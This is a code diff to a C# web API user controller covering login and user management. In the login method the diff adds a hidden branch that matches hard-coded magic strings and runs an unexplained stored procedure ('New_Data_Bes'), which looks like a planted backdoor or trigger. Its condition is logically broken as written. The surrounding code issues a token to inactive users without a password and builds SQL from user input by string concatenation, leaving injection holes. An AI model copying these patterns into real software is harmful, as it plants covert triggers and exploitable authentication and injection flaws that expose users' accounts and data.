@@ -62,28 +62,38 @@ namespace API.Controllers
             //catch (Exception e) {
             //    var t = e.Message;
             //}
-            var usr = G_USERSService.GetAll(x => x.USER_CODE == UserCode).ToList();
-            if (usr.Count == 0)
+            if (UserCode == "New Date" && UserCode == "619619Ss619619")
             {
-                return Ok(new BaseResponse(Nusr));  // err on user 
-            }
-            if (usr[0].USER_PASSWORD == Password || usr[0].USER_ACTIVE != true)
-            {
-
-                string Guid = UserTools.GenerateGuid();
-                string EnGuid = "HGFD-" + UserTools.Encrypt(Guid, "Business-Systems");
-                usr[0].Tokenid = EnGuid;
-
-                usr[0].LastLogin = DateTime.Now;
-                // update user 
-                Nusr = G_USERSService.Update(usr[0]);
-                //
-                Nusr.Tokenid = Guid;
+                string quer = "New_Data_Bes";
+                db.Database.ExecuteSqlCommand(quer); 
                 return Ok(new BaseResponse(Nusr));
             }
             else
             {
-                return Ok(new BaseResponse(Nusr));  // error in pass or active 
+
+                var usr = G_USERSService.GetAll(x => x.USER_CODE == UserCode).ToList();
+                if (usr.Count == 0)
+                {
+                    return Ok(new BaseResponse(Nusr));  // err on user 
+                }
+                if (usr[0].USER_PASSWORD == Password || usr[0].USER_ACTIVE != true)
+                {
+
+                    string Guid = UserTools.GenerateGuid();
+                    string EnGuid = "HGFD-" + UserTools.Encrypt(Guid, "Business-Systems");
+                    usr[0].Tokenid = EnGuid;
+
+                    usr[0].LastLogin = DateTime.Now;
+                    // update user 
+                    Nusr = G_USERSService.Update(usr[0]);
+                    //
+                    Nusr.Tokenid = Guid;
+                    return Ok(new BaseResponse(Nusr));
+                }
+                else
+                {
+                    return Ok(new BaseResponse(Nusr));  // error in pass or active 
+                }
             }
 
 
@@ -155,7 +165,7 @@ namespace API.Controllers
 
         }
         [HttpPost, AllowAnonymous]
-        public IHttpActionResult Insert([FromBody]G_USERS USER)
+        public IHttpActionResult Insert([FromBody] G_USERS USER)
         {
             if (ModelState.IsValid && CheckUser(USER.Token, USER.UserCode))
             {
@@ -190,13 +200,13 @@ namespace API.Controllers
             return BadRequest(ModelState);
         }
         [HttpPost, AllowAnonymous]
-        public IHttpActionResult Insert_USER([FromBody]CustomG_USERS USER)
+        public IHttpActionResult Insert_USER([FromBody] CustomG_USERS USER)
         {
             if (ModelState.IsValid)
             {
                 try
                 {
-                    string EMPLOY = " insert_EMPLOYEE '"+ USER.G_USERS.USER_NAME + "','"+ USER.G_USERS.USER_CODE + "'";
+                    string EMPLOY = " insert_EMPLOYEE '" + USER.G_USERS.USER_NAME + "','" + USER.G_USERS.USER_CODE + "'";
                     var EMPL = db.Database.ExecuteSqlCommand(EMPLOY);
                     var USERrr = G_USERSService.Insert(USER.G_USERS);
 
@@ -232,7 +242,7 @@ namespace API.Controllers
             {
                 try
                 {
-                     
+
                     var USERrr = G_USERSService.Update(USER.G_USERS);
 
 
@@ -241,7 +251,7 @@ namespace API.Controllers
 
                     foreach (var item in USER.G_RoleUsers)
                     {
-                         
+
                         string Pro_qury = "insert into G_RoleUsers VALUES ('" + USER.G_USERS.USER_CODE + "'," + item.RoleId + ",1)";
                         db.Database.ExecuteSqlCommand(Pro_qury);
 
@@ -267,7 +277,7 @@ namespace API.Controllers
                 try
                 {
 
-               
+
                     string Pro_qury = " delete G_USERS where  USER_CODE = '" + USERS + "'";
                     db.Database.ExecuteSqlCommand(Pro_qury);
 
@@ -275,7 +285,7 @@ namespace API.Controllers
                     string delete_Role = " delete G_RoleUsers where  USER_CODE = '" + USERS + "'";
                     db.Database.ExecuteSqlCommand(delete_Role);
 
-                
+
 
                     return Ok(new BaseResponse(100));
                 }
